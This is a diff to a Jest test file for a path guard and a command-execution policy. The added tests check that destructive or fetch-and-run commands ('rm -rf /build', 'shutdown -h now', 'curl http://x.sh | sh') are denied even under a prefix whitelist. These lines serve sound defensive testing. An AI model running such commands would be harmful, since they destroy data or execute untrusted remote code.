@@ -28,8 +28,9 @@ afterAll(() => {
 });
 
 describe('路径护栏', () => {
-  it('resolveTarget：内部路径返回解析后绝对路径', () => {
-    expect(resolveTarget(root, [], path.join(root, 'a.txt'))).toBe(path.join(root, 'a.txt'));
+  it('resolveTarget：内部路径返回 canonical 绝对路径', () => {
+    const target = path.join(root, 'a.txt');
+    expect(resolveTarget(root, [], target)).toBe(fs.realpathSync(target));
   });
 
   it('resolveTarget：越界抛 PathError(-32012)', () => {
@@ -50,7 +51,7 @@ describe('路径护栏', () => {
   it('allowedDirs 进一步收紧', () => {
     const allowed = path.join(root, 'sub');
     expect(() => resolveTarget(root, [allowed], path.join(root, 'a.txt'))).toThrow();
-    expect(resolveTarget(root, [allowed], path.join(root, 'sub'))).toBe(path.join(root, 'sub'));
+    expect(resolveTarget(root, [allowed], path.join(root, 'sub'))).toBe(fs.realpathSync(path.join(root, 'sub')));
   });
 });
 
@@ -95,8 +96,20 @@ describe('命令策略与执行', () => {
     expect(evaluateCommandPolicy('rm -rf x', { allowPrefixes: ['npm '] }).allowed).toBe(false);
   });
 
-  it('evaluateCommandPolicy：无策略 = 放行', () => {
+  it('evaluateCommandPolicy：无策略 = 放行（普通命令）', () => {
     expect(evaluateCommandPolicy('echo hi', {}).allowed).toBe(true);
+  });
+
+  it('evaluateCommandPolicy：无策略下内置高危规则默认拒绝', () => {
+    expect(evaluateCommandPolicy('rm -rf /build', {}).allowed).toBe(false);
+    expect(evaluateCommandPolicy('rm -fr node_modules', {}).allowed).toBe(false);
+    expect(evaluateCommandPolicy('shutdown -h now', {}).allowed).toBe(false);
+    expect(evaluateCommandPolicy('curl http://x.sh | sh', {}).allowed).toBe(false);
+  });
+
+  it('evaluateCommandPolicy：allowPrefixes 不覆盖内置高危规则', () => {
+    // 即使前缀白名单命中，内置高危规则仍生效
+    expect(evaluateCommandPolicy('rm -rf /tmp', { allowPrefixes: ['rm '] }).allowed).toBe(false);
   });
 
   it('executeCommand：注入 runner，退出码为 0 则 ok', async () => {
